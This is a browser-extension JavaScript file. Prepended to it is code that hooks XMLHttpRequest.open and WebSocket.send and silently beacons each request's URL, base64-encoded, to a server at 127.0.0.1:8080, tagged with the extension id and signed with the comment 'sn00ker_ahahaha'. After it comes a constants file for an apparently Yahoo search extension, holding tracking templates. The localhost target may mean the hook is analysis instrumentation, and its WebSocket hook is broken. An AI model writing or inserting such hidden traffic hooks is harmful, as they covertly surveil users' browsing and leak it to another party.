function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function Constants(){ //jshint ignore : line
    //Common constants
    this.TRACKER_PAGE_INFO = "page_info";
    this.TRACKER_CLICK_INFO = "click_info";
    this.TRACKER_ITYPE_INSTALL = 'install';
    this.TRACKER_ITYPE_UNINSTALL = 'uninstall';
    this.TRACKER_ITYPE_ALIVE = 'live';
    this.TRACKER_ALIVE_PING_INTERVAL = 28800000 ;// 8 hrs = 8 * 60 * 60 * 1000 milli sec.
    this.TRACKER_BROWSER_FF = "ff";
    this.TRACKER_BROWSER_CHR = "chr";
    this.TRACKER_PAGE_INFO_TEMPLATE = {
        "trackEvt": this.TRACKER_PAGE_INFO,
        "trackParams":
        {
            "ext_name": "{ext_name}",
            "intl": "{intl}",
            "vtestid": "default",
            "dc": "browser_ext_store",
            "ver": "{ver}",
            "itype": "{itype}",
            "fr": "{fr}",
            "ctid": "{ctid}",
            "mrkt": "{mrkt}",
            "delc": "{ext}",
            "browser": "{browser}",
            "os": "{os}",
            "query":"{query}",
            "kwd":"{kwd}"
        },
        "useYLC": false,
        "trackSpaceID": "{spaceId}"
    };
    this.TRACKER_CLICK_INFO_TEMPLATE = {
        "trackEvt": this.TRACKER_CLICK_INFO,
        "trackParams":
        {
            "ext_name": "{ext_name}",
            "intl": "{intl}",
            "vtestid": "default",
            "dc": "browser_ext_store",
            "ver": "{ver}",
            "ctid": "{ctid}",
            "mrkt": "{mrkt}",
            "sec": "{sec}",
            "slk": "{slk}",
            "tar": "{tar}",
            "_p": "{_p}",
            "gpos": "{gpos}",
            "delc": "{ext}",
            "browser": "{browser}",
            "os": "{os}"
        },
        "useYLC": true,
        "trackSpaceID": "{spaceId}"
    };
    this.GENERIC_EXT_SPACE_ID = 151340133;
    this.CE_EXT_NAME = 'content_enhancer';

    //Firefox Specific Constants
    this.GENERAL_USERAGENT_LOCALE = "general.useragent.locale";
    this.SEARCH_HSPART_VAL = "mozilla";
    this.SEARCH_HSIMP_VAL = "yhs-100";

    //Chrome Specific Constants
    this.chromeUninstallURL = "https://www.yahoo.com/?fr=yset_ce_chr_ext_exit";
    this.SEARCH_FRCODE = "yset_bnr_chr_win";
}
